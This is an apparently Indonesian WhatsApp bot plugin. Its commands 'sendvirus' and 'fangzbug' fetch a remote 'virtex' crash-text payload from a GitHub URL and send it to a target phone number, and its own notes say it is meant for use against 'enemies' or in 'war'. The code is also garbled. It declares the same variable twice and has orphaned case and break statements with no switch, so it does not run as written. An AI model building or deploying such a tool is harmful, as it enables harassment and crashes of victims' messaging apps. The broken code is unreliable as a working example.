import fs from 'fs'
import fetch from 'node-fetch'
import { sticker } from '../lib/sticker.js'

const { default: makeWASocket, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, downloadContentFromMessage, downloadHistory, proto, getMessage, generateWAMessageContent, prepareWAMessageMedia } = (await import('@adiwajshing/baileys')).default
let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participants }) => {
	if (!text)return m.reply(`Contoh Penggunaan : *${_p + command}* <nomor>\n\n*Note :*\nGunaka Fitur Hanya Untuk Musuh Atau War`)
	let thumb = fs.readFileSync('./thumbnail.jpg')
	let virus = await (await fetch("https://raw.githubusercontent.com/ArsyadDev1/fix-bot-v3/fix-bot-v3/virtex/doctext.txt")).text()
	let type = (args[0] || '').toLowerCase()

	const from = m.key.remoteJid
	//const participants = m.isGroup ? await groupMetadata.participants : ''
	let q = `Bug Tag From ${author}\n${text}`
	let sections = [{
		title: `Buatan by ${packname}`,
		rows: [
			{ title: 'Virtext Ganas', rowId: `${_p + command} virtext ${text}` },
		]
	}]
	let listMessage = {
		text: '*[ List Virtex ]*\n\n*Note :* Jangan Gunakan Secara Sembarangan',
		footer: packname,
		buttonText: 'Silahkan Klik Di Sini',
		sections
	}

	//==================( Quoted ) =================//
	//# Kal
	const virus = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) },
	"message": {
		"extendedTextMessage": {
			"text": `${packname}`,
			"previewType": "NONE",
			"contextInfo": {
				"stanzaId": "3EB0382EDBB2",
				"participant": "@s.whatsapp.net"
			}
		}
	}}
	//=================================================//		

			//await m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)
		}
		break
		case 'virus': {
			conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {image: thumb, virus }, {quoted: virus})
		}
		break
		default:
			if (!/[01]/.test(command)) return conn.sendMessage(m.chat, listMessage, m)
			throw false
	}
	m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)
}

handler.help = ['sendvirus <nomer>', 'fangzbug <nomer>']
handler.tags = ['bugs']
handler.command = /^sendvirus|fangzbug$/i

handler.premium = true
handler.limit = true
handler.owner = true

export default handler